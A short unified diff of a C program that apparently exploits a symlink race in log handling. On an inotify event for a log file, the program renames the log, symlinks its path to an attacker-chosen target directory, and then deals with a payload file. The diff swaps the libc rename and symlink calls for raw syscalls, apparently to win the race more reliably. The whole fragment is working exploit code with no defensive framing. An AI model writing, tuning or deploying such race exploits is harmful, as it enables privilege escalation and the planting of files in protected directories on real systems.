@@ -58,6 +58,11 @@
 #include <sys/stat.h>
 #include <getopt.h>
 
+#include <asm/unistd.h>
+#include <sys/syscall.h>
+
+#define fastsymlink(a,b) syscall(__NR_symlink,(a),(b))
+#define fastrename(a,b) syscall(__NR_rename,(a),(b))
 
 #define EVENT_SIZE  ( sizeof (struct inotify_event) )
 #define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )
@@ -232,8 +237,8 @@ while(1)
       if ( event->mask & imask ) { 
 	  if(strcmp(event->name,p) == 0)
 	  {
-            rename(logpath,logpath2);
-            symlink(targetdir,logpath);
+            fastrename(logpath,logpath2);
+            fastsymlink(targetdir,logpath);
 	    printf("Renamed %s with %s and created symlink to %s\n",logpath,logpath2,targetdir);
 	    if(payloadfile != NULL)
 	    {
